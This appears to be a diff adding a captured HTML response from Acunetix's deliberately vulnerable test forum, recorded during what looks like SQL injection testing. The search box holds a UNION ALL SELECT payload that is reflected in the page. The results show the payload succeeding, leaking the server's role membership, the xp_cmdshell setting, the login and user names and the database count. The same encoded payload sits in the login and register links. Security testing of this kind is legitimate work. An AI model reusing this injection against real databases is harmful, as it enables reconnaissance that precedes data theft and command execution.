@@ -1,0 +1,43 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>acuforum search</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+<table width="100%"  border="0" cellpadding="10" cellspacing="0"> 
+  <tr bgcolor="#008F00"> 
+    <td width="306px"><a href="https://www.acunetix.com/"><img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></td> 
+    <td align="right" valign="middle" bgcolor="#008F00" class="disclaimer">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><div class="menubar"><a href="Templatize.asp?item=html/about.html" class="menu">about</a> - <a href="Default.asp" class="menu">forums</a> - <a href="Search.asp" class="menu">search</a> 
+     - <a href="./Login.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3Dzzq%2527%2529%253e0%2529%2BUNION%2BALL%2BSELECT%2B1%252c%2527R1%5Fsysadmin%253d%2527%252bCAST%2528IS%5FSRVROLEMEMBER%2528%2527sysadmin%2527%2529%2BAS%2Bvarchar%2529%252c%2527R2%5Fdbowner%253d%2527%252bCAST%2528IS%5FSRVROLEMEMBER%2528%2527db%5Fowner%2527%2529%2BAS%2Bvarchar%2529%252c%2527R3%5Fxpcmd%5Fconf%253d%2527%252bCAST%2528%2528SELECT%2BCOUNT%2528%252a%2529%2BFROM%2Bsys%2Econfigurations%2BWHERE%2Bname%253d%2527xp%5Fcmdshell%2527%2BAND%2Bvalue%5Fin%5Fuse%253d1%2529%2BAS%2Bvarchar%2529%252c0%252c0%252cGETDATE%2528%2529%252c%2527R4%5Fsuser%253d%2527%252bSUSER%5FNAME%2528%2529%252c%2527R5%5Fuser%253d%2527%252bUSER%5FNAME%2528%2529%252c%2527R6%5Fdbs%253d%2527%252bCAST%2528%2528SELECT%2BCOUNT%2528%252a%2529%2BFROM%2Bsys%2Edatabases%2529%2BAS%2Bvarchar%2529%2D%2D" class="menu">login</a> - <a href="./Register.asp?RetURL=%2FSearch%2Easp%3FtfSearch%3Dzzq%2527%2529%253e0%2529%2BUNION%2BALL%2BSELECT%2B1%252c%2527R1%5Fsysadmin%253d%2527%252bCAST%2528IS%5FSRVROLEMEMBER%2528%2527sysadmin%2527%2529%2BAS%2Bvarchar%2529%252c%2527R2%5Fdbowner%253d%2527%252bCAST%2528IS%5FSRVROLEMEMBER%2528%2527db%5Fowner%2527%2529%2BAS%2Bvarchar%2529%252c%2527R3%5Fxpcmd%5Fconf%253d%2527%252bCAST%2528%2528SELECT%2BCOUNT%2528%252a%2529%2BFROM%2Bsys%2Econfigurations%2BWHERE%2Bname%253d%2527xp%5Fcmdshell%2527%2BAND%2Bvalue%5Fin%5Fuse%253d1%2529%2BAS%2Bvarchar%2529%252c0%252c0%252cGETDATE%2528%2529%252c%2527R4%5Fsuser%253d%2527%252bSUSER%5FNAME%2528%2529%252c%2527R5%5Fuser%253d%2527%252bUSER%5FNAME%2528%2529%252c%2527R6%5Fdbs%253d%2527%252bCAST%2528%2528SELECT%2BCOUNT%2528%252a%2529%2BFROM%2Bsys%2Edatabases%2529%2BAS%2Bvarchar%2529%2D%2D" class="menu">register</a> 
+	- <a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu">SQL scanner</a> - <a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu">SQL vuln help</a>
+    </div></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><!-- InstanceBeginEditable name="MainContentLeft" -->
+      <form name="frmSearch" method="get" action="">
+        <div class="FramedForm">
+          <input name="tfSearch" type="text" class="search">
+          <input class="search" type="submit" value="search posts">
+        </div>
+      </form>      
+        <div class='path'>You searched for 'zzq')>0) UNION ALL SELECT 1,'R1_sysadmin='+CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar),'R2_dbowner='+CAST(IS_SRVROLEMEMBER('db_owner') AS varchar),'R3_xpcmd_conf='+CAST((SELECT COUNT(*) FROM sys.configurations WHERE name='xp_cmdshell' AND value_in_use=1) AS varchar),0,0,GETDATE(),'R4_suser='+SUSER_NAME(),'R5_user='+USER_NAME(),'R6_dbs='+CAST((SELECT COUNT(*) FROM sys.databases) AS varchar)--'</div><table width="100%" cellspacing="1" cellpadding="5" bgcolor="#E5E5E5"><tr><td valign='top' align='center' bgcolor='#FFFFFF' width='120'><img src='avatars/R4_suser=acunetix'><br>posted by <b>R1_sysadmin=0</b> on 9/28/2026 8:18:16 AM</td><td valign='top' bgcolor='#FFFFFF'><div class='path'>Found in: <a href='showforum.asp?id=0'>R6_dbs=7</a>/<a href='showthread.asp?id=0'>R5_user=acunetix</a></div><div class='posttitle'></div><div class='posttext'>R3_xpcmd_conf=0</div></td></tr></table>      
+      <!-- InstanceEndEditable --></td> 
+  </tr> 
+  <tr align="right" bgcolor="#FFFFFF"> 
+    <td colspan="2" class="footer">Copyright 2019 Acunetix Ltd.</td> 
+  </tr> 
+</table> 
+<div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px">
+	<p style="padding-left:20%;padding-right:20%"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>
+</div>
+</body>
+<!-- InstanceEnd --></html>
